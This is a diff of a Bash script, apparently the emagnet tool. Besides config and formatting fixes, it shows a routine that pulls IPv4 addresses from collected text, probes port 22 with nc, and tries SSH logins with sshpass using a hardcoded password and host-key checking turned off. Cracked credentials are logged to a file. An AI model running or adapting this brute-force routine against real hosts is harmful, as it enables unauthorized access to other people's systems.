@@ -132,7 +132,7 @@ if [[ -z $EMAGNETTEMP    ]];   then sed -i "78d"  $CONF;sed -i '78  i EMAGNETTEM
 if [[ -z $EMAGNETARCHIVE ]];   then sed -i "79d"  $CONF;sed -i '79  i EMAGNETARCHIVE=$EMAGNET/archive'                                                                                         $CONF;fi
 if [[ -z $EMAGNETDB      ]];   then sed -i "80d"  $CONF;sed -i '80  i EMAGNETDB=$EMAGNETHOME\/email-files'                                                                                     $CONF;fi
 if [[ -z $EMAGNETBACKUP  ]];   then sed -i "81d"  $CONF;sed -i '81  i EMAGNETBACKUP=$EMAGNET/backup'                                                                                           $CONF;fi
-if [[ -z $EMAGNETSYNTAX  ]];   then sed -i "82d"  $CONF;sed -i '82  i EMAGNETDB=$EMAGNETHOME\/sorted-by-syntax'                                                                                $CONF;fi
+if [[ -z $EMAGNETSYNTAX  ]];   then sed -i "82d"  $CONF;sed -i '82  i EMAGNETSYNTAX=$EMAGNETHOME\/sorted-by-syntax'                                                                                $CONF;fi
 if [[ -z $VERSION        ]];   then sed -i '91d'  $CONF;sed -i '91  i VERSION=3.2'                                                                                                             $CONF;fi
 if [[ -z $THREADS        ]];   then sed -i '100d' $CONF;sed -i "100 i THREADS=1"                                                                                                               $CONF;fi
 if [[ -z $IDLETIME       ]];   then sed -i '109d' $CONF;sed -i "109 i IDLETIME=3600"                                                                                                           $CONF;fi
@@ -503,10 +503,14 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $EMAGNETHOME/.temp\
 |grep -v $SKIPLIST\
 |awk -F, '!seen[$1]++'> $SSHPORTSCAN
 if [[ $(cat /tmp/.emagnet-portscan|wc -l) -eq "0" ]]; then
+if [[ it -gt "0" ]]; then
+  printf "%19s[\e[1;31m\e[5m00\e[0m\e[0m] - Ipv4 Addresses found\n"
+else
   printf "%17s[\e[1;31m\e[5m00\e[0m\e[0m] - Ipv4 Addresses found\n"
+fi
   sleep 2
 else
-    clear;banner;
+    printf "%64s \n\n" | tr ' ' '='
     echo -e "                  PORTSCANNING - BRUTEFORCING"
     printf "\n%64s" | tr ' ' '='
     printf "\nPort/Brute attack will be started within 2 seconds..............\n"
@@ -518,7 +522,7 @@ timeout 0.5 nc -n -zv {} 22 > /dev/null 2>&1 |tee /tmp/.emagnet-sshbruter.txt 2>
 timeout 1 sshpass -p "odemnn" ssh -v "-o StrictHostKeyChecking=no" wuseman@{} pwd 2>&1 grep "Authenticated to" &> /dev/null
 
 
-if [[ $? -eq "0" ]]; then
+ if [[ $? -eq "0" ]]; then
     echo -e "[\e[1;32m>>\e[0m] - Found password: root@{}"
     echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
     echo -e "[+] Login Details For SSH - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"      >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
@@ -526,15 +530,13 @@ if [[ $? -eq "0" ]]; then
     echo -e "[+] Username: $SSHUSER"                                               >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
     echo -e "[+] Password: $SSHPASS"                                               >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
     echo -e "================================================================\n\n" >>    $EMAGNETLOGS/cracked-ssh-passwords.txt
-else
+ else
     echo -e "[\e[1;31m<<\e[0m] - Wrong password: root@{}"
     echo -e "[\e[\e[1;31m<<\e[0m] - failed to crack $SSHUSER:$SSHPASS access on: {}:22" >> $EMAGNETLOGS/failed-2-crack.txt
-fi
-#echo -e "[\e[1;32mopen..\e[0m] - {}:22" || \
-#echo -e "[\e[1;31mclosed\e[0m] - {}:22"' 
+ fi
 fi
     rm $SSHPORTSCAN $SSHTARGETS &> /dev/null
-    sleep 2
+    sleep 4
 }
 
 bruter() {
